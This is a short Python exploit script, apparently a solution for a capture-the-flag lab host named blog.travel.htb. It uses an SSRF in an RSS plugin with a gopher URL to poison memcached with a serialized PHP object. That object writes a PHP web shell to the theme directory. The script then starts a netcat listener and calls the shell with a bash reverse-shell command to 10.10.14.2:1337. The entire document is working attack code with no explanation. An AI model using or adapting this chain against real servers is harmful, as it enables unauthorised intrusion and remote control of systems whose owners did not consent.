import urllib3
import time, subprocess
import requests
import base64

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

session = requests.Session()

payloadURL = "http://blog.travel.htb/awesome-rss/?custom_feed_url&url=gopher://2130706433:11211/_%0d%0aset%20xct_4e5612ba079c530a6b1f148c0b352241%204%200%20101%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:8:%22test.php%22%3Bs:4:%22data%22%3Bs:30:%22%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a"
session.get(payloadURL, verify=False, proxies=proxies)

triggerURL = "http://blog.travel.htb/awesome-rss/"
session.get(triggerURL, verify=False, proxies=proxies)

shellURL = "http://blog.travel.htb/wp-content/themes/twentytwenty/logs/test.php"

reverseCommand = "bash -c 'bash -i >& /dev/tcp/10.10.14.2/1337 0>&1'"

payload = {
'cmd': reverseCommand
}

subprocess.Popen(["nc","-nvlp","1337"])
time.sleep(1)

session.get(shellURL, verify=False, proxies=proxies, params=payload)

